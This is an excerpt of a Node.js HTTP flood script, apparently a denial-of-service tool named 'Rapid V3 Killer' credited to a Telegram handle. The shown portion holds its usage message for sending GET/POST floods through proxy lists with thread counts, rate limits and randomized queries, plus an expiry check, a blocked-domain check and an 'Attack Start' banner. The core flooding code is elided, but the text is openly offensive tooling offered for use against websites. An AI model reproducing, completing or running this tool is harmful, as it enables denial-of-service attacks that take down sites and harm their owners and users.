...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error('Rapid V3 Killer || Telegram @thanhngocc2806');
    console.error(`
    Usage: 
        node rapidv3.js <GET/POST/HEAD/OPTIONS> <target> <port> <time> <threads> <ratelimit> <proxy> <options>
    Example:
        node rapidv3.js GET "https://example.com?q=%RAND%" 120 16 90 zmap.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
    `);
    console.error(`
    Options:
...
if (currentDate > targetDate) {
    console.error('Method out of date contact: thanhngocc2806');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked by @thanhngocc2806`);
    process.exit(1);
}
...
if (isNaN(threads) || threads <= 0 || threads > 1000) {
    console.error('Error threads can not high 1000')
    process.exit(1);
}
...
if (cluster.isMaster) {
    ...
    console.log(`Attack Start / @thanhngocc2806 | Nqn iOS  | Zoey <3 / Rapid v3`);
